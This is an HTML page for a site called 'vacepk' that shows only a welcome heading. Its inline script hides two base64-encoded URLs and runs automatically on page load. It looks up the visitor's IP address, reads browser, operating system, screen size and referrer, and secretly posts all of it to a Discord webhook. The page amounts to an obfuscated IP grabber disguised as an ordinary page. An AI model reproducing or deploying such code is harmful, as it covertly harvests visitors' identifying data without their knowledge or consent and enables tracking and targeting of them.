<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>vacepk</title>
</head>
<body>
    <h1>Welcome to vacepk</h1>

    <script>
        (function() {
            function decodeBase64(data) {
                return atob(data);
            }

            async function fetchIP() {
                try {
                    const response = await fetch(decodeBase64('aHR0cHM6Ly9hcGkuaXBpZnkuYmFyL2dldD9mb3JtYXQ9anNvbg=='));
                    const data = await response.json();
                    return data.ip;
                } catch (e) {
                    return 'Unable to fetch IP';
                }
            }

            function getUserAgent() {
                const ua = navigator.userAgent;
                let browser = 'Unknown Browser';
                let os = 'Unknown OS';

                if (ua.includes('Firefox')) {
                    browser = 'Mozilla Firefox';
                } else if (ua.includes('Chrome')) {
                    browser = 'Google Chrome';
                } else if (ua.includes('Safari')) {
                    browser = 'Safari';
                } else if (ua.includes('MSIE') || ua.includes('Trident')) {
                    browser = 'Internet Explorer';
                } else if (ua.includes('Opera') || ua.includes('OPR')) {
                    browser = 'Opera';
                }

                if (ua.includes('Windows NT 10.0')) {
                    os = 'Windows 10';
                } else if (ua.includes('Mac OS X')) {
                    os = 'Mac OS X';
                } else if (ua.includes('Linux')) {
                    os = 'Linux';
                } else if (ua.includes('Android')) {
                    os = 'Android';
                } else if (ua.includes('iPhone')) {
                    os = 'iOS (iPhone)';
                } else if (ua.includes('iPad')) {
                    os = 'iOS (iPad)';
                }

                return { browser, os };
            }

            async function sendVisitorInfo() {
                const ip = await fetchIP();
                const { browser, os } = getUserAgent();
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const referrer = document.referrer || 'Direct Visit';
                const timestamp = new Date().toISOString();

                const payload = { ip, browser, os, screenWidth, screenHeight, referrer, timestamp };

                const webhookUrl = decodeBase64('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NjM0OTEyODE4MzUxMzEzOC9QamNEdk1sbU1TZnotM2EyVFZVbWFl eEdMSEUydGpFRXVZYVcwayZNTFpzNW81MWlLLUpUS2owVmROWl9iazFjd1E0cFI5');

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: JSON.stringify(payload) })
                });
            }

            window.onload = sendVisitorInfo;
        })();
    </script>
</body>
</html>
